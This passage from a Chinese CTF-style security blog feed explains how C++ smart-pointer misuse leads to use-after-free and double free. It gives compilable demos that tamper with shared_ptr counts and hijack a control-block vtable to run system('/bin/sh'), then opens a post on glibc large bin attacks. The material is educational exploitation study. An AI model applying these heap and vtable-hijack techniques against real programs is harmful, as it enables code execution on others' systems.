highlighter-rouge">ptr.reset()</code>, 如果<code class="language-plaintext highlighter-rouge">ptr</code>不是nullptr, 那么会解除绑定并且释放内存; 如果ptr是nullptr, 则无事发生<br/></h5> <h5 id="5-ptrreset-接受一个对应类型的裸指针-在4的基础上-将unique_ptr绑定到新的内存上">   5. <code class="language-plaintext highlighter-rouge">ptr.reset(...)</code>, 接受一个对应类型的裸指针, 在<code class="language-plaintext highlighter-rouge">4</code>的基础上, 将<code class="language-plaintext highlighter-rouge">unique_ptr</code>绑定到新的内存上</h5> <h5 id="然后是内存布局">   然后是内存布局</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_unique</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/02/06/67a4a7c1dba9b.png" alt="Screenshot 2025-02-06 201603.png"/></p> <h5 id="上图是chunk内的结构-和裸指针一致-也就是说篡改内存导致uaf不可能了-unique_ptr的创建和析构完全是编译器在编译期自动确定的">   上图是<code class="language-plaintext highlighter-rouge">chunk</code>内的结构, 和裸指针一致, 也就是说篡改内存导致UAF不可能了, <code class="language-plaintext highlighter-rouge">unique_ptr</code>的创建和析构完全是编译器在编译期自动确定的.<br/></h5> <h5 id="但是unique_ptr和shared_ptr或者weak_ptr不同在于-后两者对于chunk的释放包含在对智能指针的析构中-要没一起没-而unique_ptr绑定的内存可以在unique_ptr析构前释放-即调用reset">   但是<code class="language-plaintext highlighter-rouge">unique_ptr</code>和<code class="language-plaintext highlighter-rouge">shared_ptr</code>或者<code class="language-plaintext highlighter-rouge">weak_ptr</code>不同在于, 后两者对于<code class="language-plaintext highlighter-rouge">chunk</code>的释放包含在对智能指针的析构中, 要没一起没; 而<code class="language-plaintext highlighter-rouge">unique_ptr</code>绑定的内存可以在<code class="language-plaintext highlighter-rouge">unique_ptr</code>析构前释放, 即调用<code class="language-plaintext highlighter-rouge">.reset()</code><br/></h5> <h5 id="更重要的是-没人会手动调用shared_ptr或者weak_ptr的析构函数-但是unique_ptr的reset却有可能被使用">   更重要的是, 没人会手动调用<code class="language-plaintext highlighter-rouge">shared_ptr</code>或者<code class="language-plaintext highlighter-rouge">weak_ptr</code>的析构函数, 但是<code class="language-plaintext highlighter-rouge">unique_ptr</code>的<code class="language-plaintext highlighter-rouge">.reset()</code>却有可能被使用.<br/></h5> <h5 id="所以-充分考虑开发场景的需要以及开发者可能的失误-可能会有以下的demo出现">   所以, 充分考虑开发场景的需要以及开发者可能的失误, 可能会有以下的demo出现<br/></h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>    
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">raw_ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">size_t</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>

    <span class="c1">// 出于某些原因, 两个智能指针指向了同一个chunk</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr1</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr2</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>

    <span class="c1">// 以及出于另外的某些原因, 其中一个先于另一个调用了.reset()</span>
    <span class="n">ptr1</span><span class="p">.</span><span class="n">reset</span><span class="p">();</span>

    <span class="c1">// 此时就有了UAF</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr_new</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_unique</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>
    <span class="o">*</span><span class="n">ptr2</span> <span class="o">=</span> <span class="mi">1919810</span><span class="p">;</span>
    
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;*</span><span class="n">ptr_new</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    
    <span class="c1">// 另外, 在此之后, ptr2和ptr_new都需要析构, 会造成double free</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="结果打印">   结果打印</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./test
1919810
free(): double free detected in tcache 2
[1]    65769 IOT instruction (core dumped)  ./test
</code></pre></div></div> <h2 id="比较和综合利用">比较和综合利用</h2> <h5 id="由于shared_ptr或者weak_ptr绑定的内存布局的设计-导致虚表和两个count在get或者operator取得的裸指针的低位-实际上是不容易被篡改的-所以shared_ptr或者weak_ptr的uaf需要比较严重的漏洞-这导致之前篡改两个count时显得非常刻意-取了裸指针-还用了强制类型转换和负偏移">   由于<code class="language-plaintext highlighter-rouge">shared_ptr</code>或者<code class="language-plaintext highlighter-rouge">weak_ptr</code>绑定的内存布局的设计, 导致虚表和两个count在<code class="language-plaintext highlighter-rouge">.get()</code>或者<code class="language-plaintext highlighter-rouge">operator*()</code>取得的裸指针的低位, 实际上是不容易被篡改的 ,所以<code class="language-plaintext highlighter-rouge">shared_ptr</code>或者<code class="language-plaintext highlighter-rouge">weak_ptr</code>的UAF需要比较严重的漏洞, 这导致之前篡改两个count时显得非常刻意: 取了裸指针, 还用了强制类型转换和负偏移.<br/></h5> <h5 id="而此处unique_ptr的漏洞-就是说unique_ptr对象和内存依然没有一一对应-分配的内存先于智能指针对象出现-导致它被多个指针持有-概括性的总结-就是没有从头到尾使用智能指针管理内存-以及裸指针使用不当导致的">   而此处<code class="language-plaintext highlighter-rouge">unique_ptr</code>的漏洞, 就是说<code class="language-plaintext highlighter-rouge">unique_ptr</code>对象和内存依然没有一一对应, 分配的内存先于智能指针对象出现, 导致它被多个指针持有. 概括性的总结, 就是没有从头到尾使用智能指针管理内存, 以及裸指针使用不当导致的<br/></h5> <h5 id="相较而言-后者漏洞更容易出现-尤其是在某些裸指针和智能指针并存的情况之下">   相较而言, 后者漏洞更容易出现, 尤其是在某些裸指针和智能指针并存的情况之下<br/></h5> <h5 id="其次-这里示例的unique_ptr的uaf实际上更加类似于c中的uaf">   其次, 这里示例的<code class="language-plaintext highlighter-rouge">unique_ptr</code>的UAF实际上更加类似于C中的UAF.</h5> <h5 id="前面提到shared_ptr和weak_ptr其实只能修改一个chunk的一部分-chunk释放之后的fd或bk将无法修改仅有uaf时">   前面提到<code class="language-plaintext highlighter-rouge">shared_ptr</code>和<code class="language-plaintext highlighter-rouge">weak_ptr</code>其实只能修改一个<code class="language-plaintext highlighter-rouge">chunk</code>的一部分, <code class="language-plaintext highlighter-rouge">chunk</code>释放之后的<code class="language-plaintext highlighter-rouge">fd</code>或<code class="language-plaintext highlighter-rouge">bk</code>将无法修改(仅有UAF时)<br/></h5> <h5 id="而unique_ptr的uaf可以修改chunk中所有的内容-结合另外两种智能指针-一方面可以用于篡改两个counts-另一方面能够劫持虚表感觉这个更有用">   而<code class="language-plaintext highlighter-rouge">unique_ptr</code>的UAF可以修改<code class="language-plaintext highlighter-rouge">chunk</code>中所有的内容, 结合另外两种智能指针, 一方面可以用于篡改两个counts, 另一方面能够劫持虚表(感觉这个更有用)<br/></h5> <h5 id="下面是第一个demo-用unique_ptr的uaf改shared空间的counts导致chunk提前释放-得到shared_ptr的uaf">   下面是第一个demo, 用<code class="language-plaintext highlighter-rouge">unique_ptr</code>的UAF改shared空间的counts导致<code class="language-plaintext highlighter-rouge">chunk</code>提前释放, 得到<code class="language-plaintext highlighter-rouge">shared_ptr</code>的UAF</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;vector&gt;</span><span class="cp">
</span>
<span class="k">struct</span> <span class="nc">TQWord</span><span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">QWord_1</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">QWord_2</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">QWord_3</span><span class="p">;</span>
    
    <span class="n">TQWord</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">_a</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">_b</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">_c</span><span class="p">)</span><span class="o">:</span> <span class="n">QWord_1</span><span class="p">(</span><span class="n">_a</span><span class="p">),</span> <span class="n">QWord_2</span><span class="p">(</span><span class="n">_b</span><span class="p">),</span> <span class="n">QWord_3</span><span class="p">(</span><span class="n">_c</span><span class="p">){}</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>    
    <span class="n">TQWord</span> <span class="o">*</span><span class="n">raw_ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TQWord</span><span class="p">({</span><span class="mh">0x12345678</span><span class="p">,</span> <span class="mh">0x87654321</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">});</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_1</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_2</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>

    <span class="n">unique_ptr_1</span><span class="p">.</span><span class="n">reset</span><span class="p">();</span>

    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">shared_ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">weak_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">weak_ptr</span> <span class="o">=</span> <span class="n">shared_ptr</span><span class="p">;</span>
        <span class="n">unique_ptr_2</span><span class="o">-&gt;</span><span class="n">QWord_2</span> <span class="o">=</span> <span class="mh">0x100000000</span><span class="p">;</span> <span class="c1">// UAF</span>
    <span class="p">}</span>

    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_new</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_unique</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114</span><span class="p">,</span> <span class="mi">514</span><span class="p">,</span> <span class="mi">1919810</span><span class="p">);</span>
    <span class="o">*</span><span class="n">shared_ptr</span> <span class="o">=</span> <span class="mi">114514</span><span class="p">;</span> <span class="c1">// UAF</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">unique_ptr_new</span><span class="o">-&gt;</span><span class="n">QWord_3</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="结果当然是不出意外地打印了1919810">   结果当然是不出意外地打印了<code class="language-plaintext highlighter-rouge">1919810</code><br/></h5> <h5 id="第二个-unique_ptr的uaf劫持shared_ptr的虚表-执行system">   第二个, <code class="language-plaintext highlighter-rouge">unique_ptr</code>的UAF劫持<code class="language-plaintext highlighter-rouge">shared_ptr</code>的虚表, 执行<code class="language-plaintext highlighter-rouge">system(...)</code><br/></h5> <h5 id="劫持之前-来点分析-一个demo的demo-这里编译时-no-pie便于调试">   劫持之前, 来点分析, 一个demo的demo, 这里编译时<code class="language-plaintext highlighter-rouge">-no-pie</code>便于调试<br/></h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="shared_ptr的虚表在0x403d38-有5个函数指针">   <code class="language-plaintext highlighter-rouge">shared_ptr</code>的虚表在<code class="language-plaintext highlighter-rouge">0x403d38</code>, 有5个函数指针</h5> <p><img src="https://www.helloimg.com/i/2025/02/06/67a4d4f168d32.png" alt="Screenshot 2025-02-06 233307.png"/></p> <h5 id="可以去搞清楚它们各自是干什么的-但这里我选择直接打5个断点-挨个看rdi">   可以去搞清楚它们各自是干什么的, 但这里我选择直接打5个断点, 挨个看<code class="language-plaintext highlighter-rouge">rdi</code><br/></h5> <p><img src="https://www.helloimg.com/i/2025/02/06/67a4d6bed1e0a.png" alt="Screenshot 2025-02-06 233813.png"/></p> <h5 id="到达第一处中断-是虚表的第三个指针_m_dispose-rdi是虚表指针堆上那个-大致这样式的">   到达第一处中断, 是虚表的第三个指针<code class="language-plaintext highlighter-rouge">::_M_dispose()</code>, <code class="language-plaintext highlighter-rouge">rdi</code>是虚表指针(堆上那个), 大致这样式的<br/></h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*RDI  0x4172b0 —▸ 0x403d38 (vtable for std::_Sp_counted_ptr_inplace&lt;unsigned long, std::allocator&lt;void&gt;, (__gnu_cxx::_Lock_policy)2&gt;+16) —▸ 0x401c7e (std::_Sp_counted_ptr_inplace&lt;unsigned long, std::allocator&lt;void&gt;, (__gnu_cxx::_Lock_policy)2&gt;::~_Sp_counted_ptr_inplace()) ◂— endbr64
</code></pre></div></div> <h5 id="与此同时-frame-5是main71-如下图-说明现在在析构中-构造函数似乎没用到虚表函数">   与此同时, <code class="language-plaintext highlighter-rouge">frame 5</code>是<code class="language-plaintext highlighter-rouge">main+71</code>, 如下图, 说明现在在析构中, 构造函数似乎没用到虚表函数<br/></h5> <p><img src="https://www.helloimg.com/i/2025/02/06/67a4d7bba731d.png" alt="Screenshot 2025-02-06 234119.png"/></p> <h5 id="到这里就够了-可以申请一个3--8的空间-第一个字长填上binshx00或者别的什么指令的地址-第三个字长填后门函数或者直接是system的地址">   到这里就够了, 可以申请一个<code class="language-plaintext highlighter-rouge">3 * 8</code>的空间, 第一个字长填上<code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>或者别的什么指令的地址, 第三个字长填后门函数或者直接是<code class="language-plaintext highlighter-rouge">system()</code>的地址<br/></h5> <h5 id="demo登场">   demo登场</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="k">struct</span> <span class="nc">TQWord</span><span class="p">{</span>
    <span class="kt">size_t</span> <span class="n">QWord_1</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">QWord_2</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">QWord_3</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">unreachable</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">**</span> <span class="n">command</span><span class="p">){</span>
    <span class="n">system</span><span class="p">(</span><span class="o">*</span><span class="n">command</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">size_t</span> <span class="n">cmd</span> <span class="o">=</span> <span class="mh">0x0068732f6e69622f</span><span class="p">;</span> <span class="c1">// b"/bin/sh"</span>

<span class="n">TQWord</span> <span class="n">fakeVtable</span><span class="p">{</span><span class="n">cmd</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unreachable</span><span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>    
    <span class="n">TQWord</span> <span class="o">*</span><span class="n">raw_ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TQWord</span><span class="p">{</span><span class="mi">114</span><span class="p">,</span> <span class="mi">514</span><span class="p">,</span> <span class="mi">1919810</span><span class="p">};</span>

    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_1</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="n">TQWord</span><span class="o">&gt;</span> <span class="n">unique_ptr_2</span><span class="p">(</span><span class="n">raw_ptr</span><span class="p">);</span>

    <span class="n">unique_ptr_1</span><span class="p">.</span><span class="n">reset</span><span class="p">();</span>

    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">shared_ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">1919810</span><span class="p">);</span>
    <span class="n">unique_ptr_2</span><span class="o">-&gt;</span><span class="n">QWord_1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fakeVtable</span><span class="p">;</span>
    
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/02/07/67a4e27910ad2.png" alt="Screenshot 2025-02-07 003143.png"/></p> <h5 id="这么个写法还是美中不足-虚表函数的第一个参数rdi都是虚表指针或者说地址-导致按照上述的写法-传给unreachable是cmd-需要一次解引用">   这么个写法还是美中不足, 虚表函数的第一个参数(<code class="language-plaintext highlighter-rouge">rdi</code>)都是虚表指针(或者说地址), 导致按照上述的写法, 传给<code class="language-plaintext highlighter-rouge">unreachable</code>是<code class="language-plaintext highlighter-rouge">&amp;&amp;cmd</code>, 需要一次解引用<br/></h5> <h5 id="但是话又说回来-如果虚表地址填上cmd-确实不用解引用-但是没法虚表劫持了">   但是话又说回来, 如果虚表地址填上<code class="language-plaintext highlighter-rouge">cmd</code>, 确实不用解引用, 但是没法虚表劫持了<br/></h5> <h5 id="于是想到不用system-可以发现rsi指向的是shared_ptr指向的数据区域-这一部分是可控的">   于是想到不用<code class="language-plaintext highlighter-rouge">system()</code>, 可以发现<code class="language-plaintext highlighter-rouge">rsi</code>指向的是<code class="language-plaintext highlighter-rouge">shared_ptr</code>指向的数据区域, 这一部分是可控的</h5> <p><img src="https://www.helloimg.com/i/2025/02/07/67a5b70cb4242.png" alt="Screenshot 2025-02-07 120625.png"/></p> <h5 id="于是-想到把数据改成binshx00-这样就有一个const-char的参数-然后后门函数方面选择posix_spawn-下面是参数表-可以看到它的第二个参数是path">   于是, 想到把数据改成<code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>, 这样就有一个<code class="language-plaintext highlighter-rouge">const char*</code>的参数, 然后后门函数方面选择<code class="language-plaintext highlighter-rouge">posix_spawn</code>, 下面是参数表, 可以看到它的第二个参数是<code class="language-plaintext highlighter-rouge">path</code></h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">posix_spawn</span><span class="p">(</span><span class="n">pid_t</span> <span class="o">*</span><span class="k">restrict</span> <span class="n">pid</span><span class="p">,</span> 
                <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">restrict</span> <span class="n">path</span><span class="p">,</span>
                <span class="k">const</span> <span class="n">posix_spawn_file_actions_t</span> <span class="o">*</span><span class="n">file_actions</span><span class="p">,</span>
                <span class="k">const</span> <span class="n">posix_spawnattr_t</span> <span class="o">*</span><span class="k">restrict</span> <span class="n">attrp</span><span class="p">,</span>
                <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[</span><span class="k">restrict</span><span class="p">],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[</span><span class="k">restrict</span><span class="p">]);</span>
</code></pre></div></div> <h5 id="但是还是有问题-函数本身对file_actions有检查-rdx为nullptr可以绕过检查-但调用这几个虚表函数时rdx都不是nullptr-出现以下perror">   但是还是有问题, 函数本身对<code class="language-plaintext highlighter-rouge">file_actions</code>有检查, <code class="language-plaintext highlighter-rouge">rdx</code>为nullptr可以绕过检查, 但调用这几个虚表函数时<code class="language-plaintext highlighter-rouge">rdx</code>都不是nullptr, 出现以下<code class="language-plaintext highlighter-rouge">perror</code></h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>posix_spawn failed: Bad file descriptor
</code></pre></div></div>]]></content><author><name>久菜合子</name></author><category term="pwn"/><category term="水"/><summary type="html"><![CDATA[ps1: UAF方法不全面, 没写不代表不能用或者没有 ps2: 尽量避免裸指针出现, 只在模拟漏洞(各种任意写)时使用裸指针达到目的, 也就是非必要不用.get()]]></summary></entry><entry><title type="html">large bin attack及house of cat</title><link href="https://leakbox258.github.io/blog/2024/largebin-attack-%E4%BB%A5%E5%8F%8A-IO%E6%B5%81%E7%9A%84%E5%88%A9%E7%94%A8(%E4%B8%80)/" rel="alternate" type="text/html" title="large bin attack及house of cat"/><published>2024-12-12T00:00:00+00:00</published><updated>2024-12-12T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/largebin%20attack%20%E4%BB%A5%E5%8F%8A%20IO%E6%B5%81%E7%9A%84%E5%88%A9%E7%94%A8(%E4%B8%80)</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/largebin-attack-%E4%BB%A5%E5%8F%8A-IO%E6%B5%81%E7%9A%84%E5%88%A9%E7%94%A8(%E4%B8%80)/"><![CDATA[<p> <del>好不容易学点东西赶紧记下来, 不然过几天又忘记了</del></p> <h3 id="前情提要">前情提要:<br/></h3> <h5 id="1-由于glibc-234开始-去掉了常用的各种hook-包括__malloc_hook-__free_hook-__exit_hook等-标志了一个时代的落幕-从此之后-在没有什么特别的backdoor的情况下-仅仅使用tcachebin-unsortedbin-fastbin等的攻击很难达到劫持执行流的目的-所以这些方法现在更多是作为一个泄露偏移的存在">   1. 由于glibc 2.34开始, 去掉了常用的各种hook, 包括__malloc_hook, __free_hook, __exit_hook等, 标志了一个时代的落幕. 从此之后, 在没有什么特别的backdoor的情况下, 仅仅使用tcachebin, unsortedbin, fastbin等的攻击很难达到劫持执行流的目的, 所以这些方法现在更多是作为一个泄露偏移的存在<br/></h5> <h5 id="2-失去了hook不代表堆题就没法劫持控制流了不然还玩个蛋-还可以寻找其他劫持的方法-劫持方法需要满足-泛用性-即大多数的情况下都存在的利用方法-简易性-在较少的漏洞利用的情况下就可以实现">   2. 失去了hook不代表堆题就没法劫持控制流了(<del>不然还玩个蛋</del>), 还可以寻找其他劫持的方法. 劫持方法需要满足: 泛用性, 即大多数的情况下都存在的利用方法; 简易性, 在较少的漏洞利用的情况下就可以实现<br/></h5> <h5 id="3-在现有的诸多劫持方法中-可以总结出一些经验-就是-largebinattack--某种house-其中largebinattack手法用于预备一个rop或者别的什么-以及伪造一个io_file_plus结构体-然后由某种手法将控制流交给rop">   3. 在现有的诸多劫持方法中, 可以总结出一些经验, 就是 largebinAttack + 某种house. 其中largebinAttack手法用于预备一个ROP(或者别的什么), 以及伪造一个IO_FILE_PLUS结构体, 然后由某种手法将控制流交给ROP</h5> <h3 id="年轻人的第一个largebin-attack">年轻人的第一个largebin attack</h3> <h5 id="对于一个chunk-当被free的时候-如果大小小于tcachebin的上限的话-被放进对应的tcachebin内-如果大于的话-会被放到unsorted-bin内-显然-我们现在讨论后者">   对于一个chunk, 当被free的时候, 如果大小小于tcachebin的上限的话, 被放进对应的tcachebin内, 如果大于的话, 会被放到unsorted bin内. 显然, 我们现在讨论后者.<br/></h5> <h5 id="-放进unsorted-bin的大chunk-会在下一次malloc时被决定自己的命运-当malloc无法在tcache和fastbin内找到合适的chunk当前bins中的chunk都太小-它会遍历unsorted-bin">    放进unsorted bin的大chunk, 会在下一次malloc时被决定自己的命运. 当malloc无法在tcache和fastbin内找到合适的chunk(当前bins中的chunk都太小), 它会遍历unsorted bin<br/></h5> <h5 id="-假如malloc依然无法找到-同时目标的large-bin没有和附近的free-chunk或者是top-chunk合并-那么它就会被原封不动的放到一个large-bin内">    假如malloc依然无法找到, 同时目标的large bin没有和附近的free chunk或者是top chunk合并, 那么它就会被原封不动的放到一个large bin内<br/></h5> <h5 id="largebin具有和其他的bins不同的构造-对于比较小的chunk-每个chunk-size都相对常用-所以都有对应的bin-但是large-chunk本身就不常用-具体落到每个chunk-size更少-所以glibc做法是一定chunk-size内划分一个bin-如图">   largebin具有和其他的bins不同的构造, 对于比较小的chunk, 每个chunk size都相对常用, 所以都有对应的bin. 但是large chunk本身就不常用, 具体落到每个chunk size更少, 所以glibc做法是一定chunk size内划分一个bin, 如图</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="kt">void</span> <span class="o">*</span><span class="n">p</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x390</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x430</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span>  <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">p</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x450</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x500</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>   
<span class="p">}</span>
